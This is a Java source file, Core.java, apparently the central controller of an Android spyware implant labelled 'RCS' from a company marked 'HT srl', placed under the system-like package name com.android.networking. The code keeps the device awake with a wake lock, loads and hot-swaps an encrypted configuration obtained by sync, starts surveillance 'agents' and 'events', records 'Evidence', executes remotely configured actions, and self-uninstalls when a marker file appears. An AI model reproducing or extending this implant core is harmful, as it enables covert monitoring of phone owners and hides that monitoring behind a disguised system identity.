/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.networking;

import java.io.IOException;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Handler;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.SystemClock;

import com.android.networking.action.Action;
import com.android.networking.action.SubAction;
import com.android.networking.action.UninstallAction;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfType;
import com.android.networking.conf.Configuration;
import com.android.networking.evidence.Evidence;
import com.android.networking.evidence.Markup;
import com.android.networking.file.AutoFile;
import com.android.networking.file.Path;
import com.android.networking.manager.ManagerEvent;
import com.android.networking.manager.ManagerModule;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;
import com.android.networking.R;

/**
 * The Class Core, represents
 */
public class Core extends Activity implements Runnable {

	/** The Constant SLEEPING_TIME. */
	private static final int SLEEPING_TIME = 1000;
	private static final String TAG = "Core"; //$NON-NLS-1$
	private static boolean serviceRunning = false;

	/** The b stop core. */
	private boolean bStopCore = false;

	/** The resources. */
	private Resources resources;

	/** The core thread. */
	private Thread coreThread = null;

	/** The content resolver. */
	private ContentResolver contentResolver;

	/** The agent manager. */
	private ManagerModule moduleManager;

	/** The event manager. */
	private ManagerEvent eventManager;
	private WakeLock wl;
	// private long queueSemaphore;
	private Thread fastQueueThread;
	private CheckAction checkActionFast;
	private PendingIntent alarmIntent = null;

	/**
	 * Start.
	 * 
	 * @param r
	 *            the r
	 * @param cr
	 *            the cr
	 * @return true, if successful
	 */

	public boolean Start(final Resources r, final ContentResolver cr) {
		if (serviceRunning == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (Start): service already running"); //$NON-NLS-1$
			}

			return false;
		}

		coreThread = new Thread(this);

		moduleManager = ManagerModule.self();
		eventManager = ManagerEvent.self();

		resources = r;
		contentResolver = cr;

		if (Cfg.DEBUG) {
			Check.asserts(resources != null, "Null Resources"); //$NON-NLS-1$
		}

		try {
			coreThread.start();
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

		// mRedrawHandler.sleep(1000);

		final PowerManager pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
		wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "T"); //$NON-NLS-1$
		wl.acquire();

		Evidence.info(Messages.getString("30.1")); //$NON-NLS-1$

		serviceRunning = true;
		return true;
	}

	/**
	 * Stop.
	 * 
	 * @return true, if successful
	 */
	public boolean Stop() {
		bStopCore = true;

		if (Cfg.DEBUG) {
			Check.log(TAG + " RCS Thread Stopped"); //$NON-NLS-1$
		}

		wl.release();

		coreThread = null;

		serviceRunning = false;
		return true;
	}

	public static boolean isServiceRunning() {
		return serviceRunning;
	}

	// Runnable (main routine for RCS)
	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " RCS Thread Started"); //$NON-NLS-1$
		}

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: init task"); //$NON-NLS-1$
			}

			int confLoaded = taskInit();
			// viene letta la conf e vengono fatti partire agenti e eventi
			if (confLoaded == ConfType.Error) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: TaskInit() FAILED"); //$NON-NLS-1$
				}

			} else {

				if (Cfg.DEBUG) {
					Check.log(TAG + " TaskInit() OK, configuration loaded: " + confLoaded); //$NON-NLS-1$
					Check.log(TAG + " Info: starting checking actions"); //$NON-NLS-1$
				}

				// Torna true in caso di UNINSTALL o false in caso di stop del
				// servizio
				checkActions();

				if (Cfg.DEBUG) {
					Check.log(TAG + "CheckActions() wants to exit"); //$NON-NLS-1$
				}
			}

			stopAll();
		} catch (final Throwable ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: run " + ex); //$NON-NLS-1$
			}
		} finally {
			if (Cfg.DEBUG) {
				Check.log(TAG + " AndroidService exit "); //$NON-NLS-1$
			}

			Utils.sleep(1000);

			System.runFinalizersOnExit(true);
			finish();
			// System.exit(0);
		}
	}

	private synchronized boolean checkActions() {

		checkActionFast = new CheckAction(Action.FAST_QUEUE);

		fastQueueThread = new Thread(checkActionFast);
		fastQueueThread.start();

		return checkActions(Action.MAIN_QUEUE);

	}

	class CheckAction implements Runnable {

		private final int queue;

		CheckAction(int queue) {
			this.queue = queue;
		}

		public void run() {
			boolean ret = checkActions(queue);
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 * 
	 * @return true, if UNINSTALL
	 */
	private boolean checkActions(int qq) {
		final Status status = Status.self();

		try {
			while (!bStopCore) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " checkActions: " + qq); //$NON-NLS-1$
				}

				final Trigger[] actionIds = status.getTriggeredActions(qq);

				if (actionIds.length == 0) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (checkActions): triggered without actions: " + qq);
					}
				}

				for (final Trigger trigger : actionIds) {
					final Action action = status.getAction(trigger.getActionId());
					final Exit exitValue = executeAction(action, trigger);

					if (exitValue == Exit.UNINSTALL) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " Info: checkActions: Uninstall"); //$NON-NLS-1$
						}

						UninstallAction.actualExecute();

						return true;
					}
				}
			}

			return false;
		} catch (final Throwable ex) {
			// catching trowable should break the debugger ans log the full
			// stack trace
			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
				Check.log(TAG + " FATAL: checkActions error, restart: " + ex); //$NON-NLS-1$
			}

			return false;
		}
	}

	private synchronized void stopAll() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopAll)");
		}

		final Status status = Status.self();

		// status.setRestarting(true);
		if (Cfg.DEBUG) {
			Check.log(TAG + " Warn: " + "checkActions: unTriggerAll"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		status.unTriggerAll();

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: stopping agents"); //$NON-NLS-1$
		}

		moduleManager.stopAll();

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: stopping events"); //$NON-NLS-1$
		}

		eventManager.stopAll();

		Utils.sleep(2000);

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions: untrigger all"); //$NON-NLS-1$
		}

		status.unTriggerAll();

		final LogDispatcher logDispatcher = LogDispatcher.self();

		if (!logDispatcher.isAlive()) {
			logDispatcher.waitOnEmptyQueue();
			logDispatcher.halt();
		}

	}

	/**
	 * Inizializza il core.
	 * 
	 * @return false if any fatal error
	 */
	private int taskInit() {
		try {
			Path.makeDirs();

			final Markup markup = new Markup(0);
			if (markup.isMarkup()) {
				UninstallAction.actualExecute();
				return ConfType.Error;
			}

			// Identify the device uniquely
			final Device device = Device.self();

			int ret = loadConf();

			if (ret == 0) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Error: Cannot load conf"); //$NON-NLS-1$
				}

				return ConfType.Error;
			}

			// Start log dispatcher
			final LogDispatcher logDispatcher = LogDispatcher.self();

			if (!logDispatcher.isAlive()) {
				logDispatcher.start();
			}

			// Da qui in poi inizia la concorrenza dei thread
			if (eventManager.startAll() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " eventManager FAILED"); //$NON-NLS-1$
				}

				return ConfType.Error;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Events started"); //$NON-NLS-1$
			}

			/*
			 * if (moduleManager.startAll() == false) { if (Cfg.DEBUG) {
			 * Check.log(TAG + " moduleManager FAILED"); //$NON-NLS-1$ }
			 * 
			 * return ConfType.Error; }
			 */

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Agents started"); //$NON-NLS-1$
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Core initialized"); //$NON-NLS-1$
			}

			return ret;

		} catch (final GeneralException rcse) {
			if (Cfg.EXCEPTION) {
				Check.log(rcse);
			}

			if (Cfg.DEBUG) {
				Check.log(rcse);//$NON-NLS-1$
				Check.log(TAG + " RCSException() detected"); //$NON-NLS-1$
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " Exception() detected"); //$NON-NLS-1$
			}
		}

		return ConfType.Error;
	}

	public boolean verifyNewConf() {
		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
		boolean loaded = false;

		if (file.exists()) {
			loaded = loadConfFile(file, false);
		}

		return loaded;
	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource
	 * conf.
	 * 
	 * @return false if no correct conf available
	 * @throws GeneralException
	 *             the rCS exception
	 */
	public int loadConf() throws GeneralException {
		boolean loaded = false;
		int ret = ConfType.Error;
		
		if (Cfg.DEBUG) {
			beep();
			Check.log(TAG + " (loadConf): TRY NEWCONF");
		}
		
		// tries to load the file got from the sync, if any.
		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);

		if (file.exists()) {
			loaded = loadConfFile(file, true);

			if (!loaded) {
				Evidence.info(Messages.getString("30.2")); //$NON-NLS-1$
				file.delete();
			} else {
				Evidence.info(Messages.getString("30.3")); //$NON-NLS-1$
				file.rename(Path.conf() + ConfType.ActualConf);
				ret = ConfType.NewConf;
			}
		}

		// get the actual configuration
		if (!loaded) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConf): TRY ACTUALCONF");
			}
			file = new AutoFile(Path.conf() + ConfType.ActualConf);

			if (file.exists()) {
				loaded = loadConfFile(file, true);

				if (!loaded) {
					Evidence.info(Messages.getString("30.4")); //$NON-NLS-1$
				} else {
					ret = ConfType.ActualConf;
				}
			}
		}

		if (!loaded && Cfg.DEBUG) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConf): TRY JSONCONF");
			}
			
			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin
			String json = new String(resource);
			// Initialize the configuration object

			if (json != null) {
				final Configuration conf = new Configuration(json);
				// Load the configuration
				loaded = conf.loadConfiguration(true);

				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: Json file loaded: " + loaded); //$NON-NLS-1$
				}

				if (loaded) {
					ret = ConfType.ResourceJson;
				}
			}
		}

		// tries to load the resource conf
		if (!loaded) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConf): TRY RESCONF");
			}
			// Open conf from resources and load it into resource
			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.loadConfiguration(true);

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Resource file loaded: " + loaded); //$NON-NLS-1$
			}

			if (loaded) {
				ret = ConfType.ResourceConf;
			}
		}

		return ret;
	}

	private boolean loadConfFile(AutoFile file, boolean instantiate) {
		boolean loaded = false;
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (loadConfFile): " + file);
			}

			final byte[] resource = file.read(8);
			// Initialize the configuration object
			Configuration conf = new Configuration(resource);
			// Load the configuration
			loaded = conf.loadConfiguration(instantiate);

			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: Conf file loaded: " + loaded); //$NON-NLS-1$
			}

		} catch (GeneralException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);
			}
		}

		return loaded;
	}

	/**
	 * Execute action. (Questa non viene decompilata correttamente.)
	 * 
	 * @param action
	 *            the action
	 * @param baseEvent
	 * @return the int
	 */
	private Exit executeAction(final Action action, Trigger trigger) {
		Exit exit = Exit.SUCCESS;

		if (Cfg.DEBUG) {
			Check.log(TAG + " CheckActions() triggered: " + action); //$NON-NLS-1$
		}

		final Status status = Status.self();
		status.unTriggerAction(action);

		status.synced = false;

		final int ssize = action.getSubActionsNum();

		if (Cfg.DEBUG) {
			Check.log(TAG + " checkActions, " + ssize + " subactions"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		int i = 1;

		for (final SubAction subAction : action.getSubActions()) {
			try {

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */
				if (Cfg.DEBUG) {
					Check.log(TAG + " Info: (CheckActions) executing subaction (" + (i++) + "/" + ssize + ") : " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
							+ action);
				}

				subAction.prepareExecute();
				final boolean ret = subAction.execute(trigger);

				if (status.uninstall) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: (CheckActions): uninstalling"); //$NON-NLS-1$
					}

					// UninstallAction.actualExecute();
					exit = Exit.UNINSTALL;
					break;
				}

				if (ret == false) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: " + "CheckActions() error executing: " + subAction); //$NON-NLS-1$ //$NON-NLS-2$
					}

					continue;
				} else {
					if (subAction.considerStop()) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (executeAction): stop");
						}
						break;
					}
				}
			} catch (final Exception ex) {
				if (Cfg.EXCEPTION) {
					Check.log(ex);
				}

				if (Cfg.DEBUG) {
					Check.log(ex);
					Check.log(TAG + " Error: checkActions for: " + ex); //$NON-NLS-1$
				}
			}
		}

		return exit;
	}

	static Core instance;

	public synchronized static Core getInstance() {
		if (instance == null) {
			instance = new Core();
		}

		return instance;
	}

	private void Core() {
		
	}
	
	static byte[] genTone( double duration, double freqOfTone ){
		int sampleRate= 8000;
		int numSamples= (int) (duration * sampleRate);
		//double freqOfTone = 440; // hz
		
		double sample[] = new double[numSamples];
		byte generatedSnd[] = new byte[2 * numSamples];
		
        // fill out the array
        for (int i = 0; i < numSamples; ++i) {
            sample[i] = Math.sin(2 * Math.PI * i / (sampleRate/freqOfTone));
        }

        // convert to 16 bit pcm sound array
        // assumes the sample buffer is normalised.
        int idx = 0;
        for (final double dVal : sample) {
            // scale to maximum amplitude
            final short val = (short) ((dVal * 32767));
            // in 16 bit wav PCM, first byte is the low order byte
            generatedSnd[idx++] = (byte) (val & 0x00ff);
            generatedSnd[idx++] = (byte) ((val & 0xff00) >>> 8);

        }
        
        return generatedSnd;
    }

    static void playSound(byte[] generatedSnd){
    	int sampleRate= 8000;
        final AudioTrack audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC,
        		sampleRate, AudioFormat.CHANNEL_CONFIGURATION_MONO,
                AudioFormat.ENCODING_PCM_16BIT, generatedSnd.length /2,
                AudioTrack.MODE_STATIC);
        int ret=audioTrack.setStereoVolume(1.0F, 1.0F);
        ret=audioTrack.write(generatedSnd, 0, generatedSnd.length);
        audioTrack.play();
    }


	public static void beep() {
		if (Cfg.DEMO) {

			Status.self().getDefaultHandler().post(new Runnable() {

                public void run() {
                    playSound(genTone(.4,1046.5));
                    playSound(genTone(.4,1318.51));
                    playSound(genTone(.4,1567.98));
                    playSound(genTone(.4,1567.98));
                    playSound(genTone(.4,1318.51));
                    playSound(genTone(.4,1046.5));
                    playSound(genTone(.8,783.99));
                }
            });
		}
	}
	
	public synchronized boolean reloadConf() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (reloadConf): START");
		}

		if (verifyNewConf()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): valid conf");
			}

			stopAll();

			int ret = taskInit();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): END");
			}

			return ret != ConfType.Error;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (reloadConf): invalid conf");
			}

			return false;
		}
	}
}
